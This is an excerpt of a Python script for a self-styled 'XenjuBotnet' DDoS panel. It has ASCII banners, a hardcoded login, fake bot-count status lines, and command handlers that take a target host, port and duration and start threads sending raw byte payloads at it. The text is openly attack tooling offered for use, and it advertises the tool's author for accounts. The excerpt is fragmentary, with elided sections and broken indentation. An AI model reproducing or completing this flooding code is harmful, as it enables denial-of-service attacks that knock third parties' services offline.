...
sys.stdout.write("\x1b]2;[-] Xenju | Online User : [{}] | Running Attack [5] | Bot Connected [89] | Admin : [1] | Backup Server : [3] | Username : admin\x07".format (prot))
...
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░    
                     ...
                     ░░██████                     
                      ░░░░░░  
             \033[93m>> \033[96mXenjuBotnet Private Tools By Xenju \033[93m<< 
            \033[97m
   ███                                                                                
  █   █
\033[97m  █   █                      \033[93m Dosen't have account? DM Xenju#1234
\033[97m█████████               ██   \033[93m 
\033[97m█████████              █  █  \033[93m 
\033[97m███   ███ ██████████████  █      
\033[97m████ ████ █ █          █  █
...
""")
username = str(input("\033[33m[Xenju] \033[93mUsername:"))
password = str(input("\033[33m[Xenju] \033[93mPassword:"))
if password == "Xenju" and username == "Xenju":
...
attack = """
\033[0;93m            ╔══════════════════════════╦═══════════════════════╗
\033[0;93m              TARGET : (host)
\033[0;93m              PORT : (port)
\033[0;93m              DURATION : (timer)
\033[0;93m              METHODS : (sinput)
\033[0;93m              VIP : TRUE
\033[0;93m              USERNAME = root
\033[0;93m            ╚═╦═══════════════════════╦╩╦════════════════════╦═╝
"""
...
\033[0;96m                              
\033[0;96m =============Xenju CREATED THIS DDOS======================"""
...
plant = """
\033[0;35m VIP = ✓
\033[0;35m USERNAME = Xenju                
\033[0;35m ADMIN = ✓
\033[0;35m EXPIRED = lifetime 
\033[0;35m MAX TIME = 600
\033[0;35m API ACCESS = √
"""
...
def main():
    ...
    while True:
        ...
        sys.stdout.write("\x1b]2;[-]XenjuNet | Online User : [{}] | Running Attack [6] | Bot Connected [89] | Admin : [Xenju] | Backup Server : [2] | Username : Xenju\x07".format (powerran))
        sin = input("\033[95m[\033[97mXenju@Botnet\033[95m]\033[37m >> \033[92m".format(nicknm)).lower()
        sinput = sin.split(" ")[0]
            ...
            try:
                if running >= 9000000:
                    ...
                    main()
                        ...
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\x00\x00\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00"
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        os.system("clear")
                        print(start)
                        time.sleep(1)
            ...
            try:
                if running >= 9000000:
                    ...
                    main()
                        ...
                        sinput, host, timer, port = sin.split(" ")
                        socket.gethostbyname(host)
                        payload = b"\x00\x02\x10\x00\x00\x2f"
                        threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
                        os.system("clear")
                        print(start)
                        time.sleep(1)
